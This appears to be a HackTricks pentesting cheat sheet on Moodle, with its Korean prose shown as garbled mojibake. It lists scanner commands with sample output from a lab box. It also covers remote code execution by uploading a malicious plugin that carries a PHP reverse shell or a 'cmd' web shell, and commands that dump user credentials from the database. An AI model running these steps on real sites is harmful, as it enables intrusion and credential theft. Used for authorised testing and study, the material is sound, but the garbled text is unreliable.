# Moodle

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **í•´ì»¤ë“¤ì— ì˜í•´ ë§Œë“¤ì–´ì§„ í”„ë¦¬ë¯¸ì—„ ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼ì¸ Intigritiì— ê°€ì…**í•˜ì„¸ìš”! ì˜¤ëŠ˜ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì°¸ì—¬í•˜ì—¬ ìµœëŒ€ **$100,000**ì˜ ë°”ìš´í‹°ë¥¼ íšë“í•˜ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

## ìë™ ìŠ¤ìº”

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

### moodlescan
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

### CMSMap
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

ë‚˜ëŠ” ìë™ ë„êµ¬ë“¤ì´ moodle ë²„ì „ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ê±°ì˜ **ì“¸ëª¨ê°€ ì—†ë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆë‹¤**. ì´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)

## **RCE**

**ë§¤ë‹ˆì €** ì—­í• ì´ í•„ìš”í•˜ë©° **"ì‚¬ì´íŠ¸ ê´€ë¦¬"** íƒ­ ë‚´ì—ì„œ **í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**\*\*:\*\*

![](<../../.gitbook/assets/image (447).png>)

ë§¤ë‹ˆì €ì´ë”ë¼ë„ **ì´ ì˜µì…˜ì„ í™œì„±í™”í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**. moodle ê¶Œí•œ ìƒìŠ¹ PoCì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

ê·¸ëŸ° ë‹¤ìŒ, ë‹¤ìŒ í”ŒëŸ¬ê·¸ì¸ì„ **ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ í”ŒëŸ¬ê·¸ì¸ì—ëŠ” í´ë˜ì‹ pentest-monkey php r**ev shell**ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤ (_ì—…ë¡œë“œí•˜ê¸° ì „ì— ì••ì¶•ì„ í’€ê³ , revshellì˜ IP ë° í¬íŠ¸ë¥¼ ë³€ê²½í•˜ê³  ë‹¤ì‹œ ì••ì¶•í•´ì•¼ í•©ë‹ˆë‹¤_)

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

ë˜ëŠ” "cmd" ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¼ë°˜ PHP ì‰˜ì„ ì–»ê¸° ìœ„í•´ [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE)ì—ì„œ í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì•…ì˜ì ì¸ í”ŒëŸ¬ê·¸ì¸ì„ ì‹¤í–‰í•˜ë ¤ë©´ ë‹¤ìŒì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### ë°ì´í„°ë² ì´ìŠ¤ ìê²© ì¦ëª… ì°¾ê¸°
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ìê²© ì¦ëª… ë¤í”„í•˜ê¸°
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **Intigriti**ì— ê°€ì…í•˜ì—¬ í•´ì»¤ë“¤ì´ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**ì— ì°¸ì—¬í•˜ì„¸ìš”! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì˜¤ëŠ˜ ê°€ì…í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë°”ìš´í‹°ë¥¼ ë°›ì•„ë³´ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° íˆì–´ë¡œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
